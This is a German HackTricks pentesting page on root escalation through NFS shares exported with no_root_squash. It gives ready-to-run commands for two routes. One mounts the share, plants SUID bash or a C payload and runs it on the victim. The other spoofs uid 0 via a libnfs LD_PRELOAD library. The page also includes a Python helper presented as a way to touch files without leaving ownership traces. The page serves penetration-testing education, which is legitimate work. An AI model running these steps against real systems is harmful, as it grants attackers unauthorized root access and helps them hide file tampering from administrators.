# Privilege Escalation durch NFS-No-Root-Squash-Fehlkonfiguration

{{#include ../../banners/hacktricks-training.md}}

## Grundlegende Informationen zu Squashing

NFS vertraut normalerweise (insbesondere unter Linux) auf die vom Client angegebenen `uid` und `gid`, um auf die Dateien zuzugreifen (wenn kein Kerberos verwendet wird). Es gibt jedoch einige Konfigurationen, die auf dem Server gesetzt werden können, um **dieses Verhalten zu ändern**:

- **`all_squash`**: Es werden alle Zugriffe eingeschränkt, indem jeder Benutzer und jede Gruppe auf **`nobody`** (65534 unsigned / -2 signed) abgebildet wird. Daher ist jeder `nobody`, und es werden keine Benutzer verwendet.
- **`root_squash`/`no_all_squash`**: Dies ist die Standardeinstellung unter Linux und **schränkt nur Zugriffe mit der uid 0 (root)** ein. Daher werden alle `UID` und `GID` vertraut, aber `0` wird auf `nobody` abgebildet (dadurch ist keine root-Identitätsübernahme möglich).
- **``no_root_squash`**: Wenn diese Konfiguration aktiviert ist, wird nicht einmal der root-Benutzer eingeschränkt. Das bedeutet, dass du auf ein Verzeichnis mit dieser Konfiguration als root zugreifen kannst, wenn du es mountest.

Wenn du in der Datei **/etc/exports** ein Verzeichnis findest, das als **no_root_squash** konfiguriert ist, kannst du als **Client** darauf **zugreifen** und **in dieses Verzeichnis schreiben**, **als** wärst du der lokale **root** des Systems.

Weitere Informationen zu **NFS** findest du unter:

{{#ref}}
../../network-services-pentesting/nfs-service-pentesting.md
{{#endref}}

## Privilege Escalation

### Remote Exploit

Option 1 mit bash:
- **Mounten dieses Verzeichnisses** auf einem Client-System und **als root Kopieren** der **/bin/bash**-Binary in den gemounteten Ordner sowie das Vergeben von **SUID**-Rechten und **Ausführen dieser bash-Binary auf dem** Zielsystem.
- Beachte, dass auf dem NFS-Share **`no_root_squash`** auf dem Server konfiguriert sein muss, um root zu sein.
- Wenn dies jedoch nicht aktiviert ist, könntest du zu einem anderen Benutzer eskalieren, indem du die Binary auf den NFS-Share kopierst und ihr die SUID-Berechtigung des Benutzers gibst, zu dem du eskalieren möchtest.
```bash
#Attacker, as root user
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /bin/bash .
chmod +s bash

#Victim
cd <SHAREDD_FOLDER>
./bash -p #ROOT shell
```
Option 2 mit kompiliertem C-Code:
- **Das Einhängen dieses Verzeichnisses** auf einer Client-Maschine und **als root das Kopieren** unseres kompilierten Payloads in den eingehängten Ordner, der die SUID-Berechtigung missbraucht, ihm **SUID**-Rechte zu geben und diese Binärdatei auf der **Victim**-Maschine **auszuführen** (hier findest du einige [C-SUID-Payloads](../processes-crontab-systemd-dbus/payloads-to-execute.md#c)).
- Dieselben Einschränkungen wie zuvor
```bash
#Attacker, as root user
gcc payload.c -o payload
mkdir /tmp/pe
mount -t nfs <IP>:<SHARED_FOLDER> /tmp/pe
cd /tmp/pe
cp /tmp/payload .
chmod +s payload

#Victim
cd <SHAREDD_FOLDER>
./payload #ROOT shell
```
### Lokaler Exploit

> [!TIP]
> Beachte, dass du weiterhin die Remote-Version verwenden kannst, um diese Privilege Escalation auszunutzen, wenn du **einen Tunnel von deiner Maschine zur Opfermaschine erstellen kannst, indem du die erforderlichen Ports tunnelt**.\
> Der folgende Trick ist für den Fall gedacht, dass die Datei `/etc/exports` **eine IP-Adresse angibt**. In diesem Fall **kannst du den** **Remote Exploit** in keinem Fall verwenden und musst **diesen Trick ausnutzen**.\
> Eine weitere Voraussetzung dafür, dass der Exploit funktioniert, ist, dass der **Export in `/etc/export`** das Flag `insecure` **verwenden muss**.\
> --_Ich bin mir nicht sicher, ob dieser Trick funktioniert, wenn `/etc/export` eine IP-Adresse angibt_--

### Grundlegende Informationen

Das Szenario umfasst die Ausnutzung eines gemounteten NFS-Shares auf einer lokalen Maschine unter Ausnutzung eines Fehlers in der NFSv3-Spezifikation, durch den der Client seine uid/gid angeben kann, was möglicherweise unbefugten Zugriff ermöglicht. Die Ausnutzung erfolgt mit [libnfs](https://github.com/sahlberg/libnfs), einer Bibliothek, die das Fälschen von NFS-RPC-Aufrufen ermöglicht.<sup>[[1]](#references)</sup>

#### Kompilieren der Bibliothek

Die Schritte zum Kompilieren der Bibliothek müssen möglicherweise abhängig von der Kernel-Version angepasst werden. In diesem speziellen Fall wurden die fallocate-Syscalls auskommentiert. Der Kompilierungsprozess umfasst die folgenden Befehle:
```bash
./bootstrap
./configure
make
gcc -fPIC -shared -o ld_nfs.so examples/ld_nfs.c -ldl -lnfs -I./include/ -L./lib/.libs/
```
#### Durchführen des Exploits

Der Exploit umfasst das Erstellen eines einfachen C-Programms (`pwn.c`), das die Privilegien auf root erhöht und anschließend eine Shell startet. Das Programm wird kompiliert, und die resultierende Binary (`a.out`) wird mit suid root auf dem share abgelegt, wobei `ld_nfs.so` verwendet wird, um die uid in den RPC-Aufrufen zu fälschen:

1. **Exploit-Code kompilieren:**
```bash
cat pwn.c
int main(void){setreuid(0,0); system("/bin/bash"); return 0;}
gcc pwn.c -o a.out
```
2. **Platziere den Exploit auf dem Share und ändere seine Berechtigungen, indem du die uid fälschst:**
```bash
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so cp ../a.out nfs://nfs-server/nfs_root/
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chown root: nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod o+rx nfs://nfs-server/nfs_root/a.out
LD_NFS_UID=0 LD_LIBRARY_PATH=./lib/.libs/ LD_PRELOAD=./ld_nfs.so chmod u+s nfs://nfs-server/nfs_root/a.out
```
3. **Exploit ausführen, um Root-Rechte zu erlangen:**
```bash
/mnt/share/a.out
#root
```
### Bonus: NFShell für unauffälligen Dateizugriff

Sobald root access erlangt wurde, wird ein Python-Skript (nfsh.py) verwendet, um mit dem NFS share zu interagieren, ohne den Eigentümer zu ändern (um keine Spuren zu hinterlassen). Dieses Skript passt die uid an die des verwendeten Files an und ermöglicht so die Interaktion mit Files auf dem share ohne Berechtigungsprobleme:<sup>[[1]](#references)</sup>
```python
#!/usr/bin/env python
# script from https://www.errno.fr/nfs_privesc.html
import sys
import os

def get_file_uid(filepath):
try:
uid = os.stat(filepath).st_uid
except OSError as e:
return get_file_uid(os.path.dirname(filepath))
return uid

filepath = sys.argv[-1]
uid = get_file_uid(filepath)
os.setreuid(uid, uid)
os.system(' '.join(sys.argv[1:]))
```
Ausführen wie:
```bash
# ll ./mount/
drwxr-x---  6 1008 1009 1024 Apr  5  2017 9.3_old
```
## Referenzen

- [1] [Eine Geschichte über eine weniger bekannte NFS-privesc](https://www.errno.fr/nfs_privesc.html)

{{#include ../../banners/hacktricks-training.md}}
